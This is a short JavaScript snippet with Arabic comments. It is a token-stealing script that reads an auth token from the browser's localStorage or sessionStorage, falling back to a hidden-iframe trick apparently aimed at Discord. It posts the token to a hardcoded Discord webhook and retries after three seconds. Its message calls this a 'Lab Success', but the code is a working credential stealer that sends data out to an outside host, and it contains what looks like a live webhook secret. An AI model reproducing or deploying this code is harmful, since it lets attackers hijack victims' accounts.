(function() {
    const webhook = "https://discord.com/api/webhooks/1466835198942515254/MCAPfFl1novelcM6QGl9ZKP56zB1hijO6UdOm9zi-frGJ7pw6kE0mFDnqANHJCohg8JD";

    function sendData(token) {
        const request = new XMLHttpRequest();
        request.open("POST", webhook, true);
        request.setRequestHeader("Content-Type", "application/json");
        request.send(JSON.stringify({
            content: "👑 **Lab Success - Final Capture:**\n`" + token + "`"
        }));
    }

    function grab() {
        try {
            // الطريقة 1: التخزين المحلي المباشر
            let t = window.localStorage.getItem('token') || window.sessionStorage.getItem('token');
            
            // الطريقة 2: الالتفاف عبر Iframe (لحل مشكلة undefined)
            if (!t || t === 'undefined') {
                const ifr = document.createElement('iframe');
                ifr.style.display = 'none';
                document.body.appendChild(ifr);
                t = ifr.contentWindow.localStorage.token;
                ifr.remove();
            }

            if (t) {
                sendData(t.replace(/"/g, ""));
                return true;
            }
        } catch (e) {}
        return false;
    }

    // المحاولة فوراً ثم بعد 3 ثوانٍ لضمان تحميل البيانات
    grab();
    setTimeout(grab, 3000);
})();
